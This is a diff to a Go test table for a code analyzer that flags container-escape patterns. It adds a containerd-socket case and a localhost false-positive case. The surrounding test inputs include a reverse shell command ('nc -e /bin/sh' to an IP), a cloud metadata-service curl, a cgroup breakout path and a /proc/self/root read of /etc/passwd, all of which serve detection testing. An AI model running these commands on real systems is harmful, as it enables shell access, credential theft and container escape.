@@ -16,6 +16,8 @@ func TestAnalyzeCode(t *testing.T) {
 		{"proc_self_root", `f = open("/proc/self/root/etc/passwd")`, 1, "proc_self_access"},
 		{"cgroup breakout", `open("/sys/fs/cgroup/notify_on_release")`, 1, "container_breakout"},
 		{"docker socket", `cat /var/run/docker.sock`, 1, "host_mount_access"},
+		{"containerd socket", `ls /var/run/containerd/containerd.sock`, 1, "host_mount_access"},
+		{"host in URL (no false positive)", `fetch("http://localhost:3000/host/status")`, 0, ""},
 		{"dirty_cow", `exploit = dirty_cow_payload()`, 1, "kernel_exploit"},
 		{"metadata service", `curl 169.254.169.254/latest/meta-data/`, 1, "metadata_service"},
 		{"reverse shell", `nc -e /bin/sh 10.0.0.1 4444`, 1, "reverse_shell"},
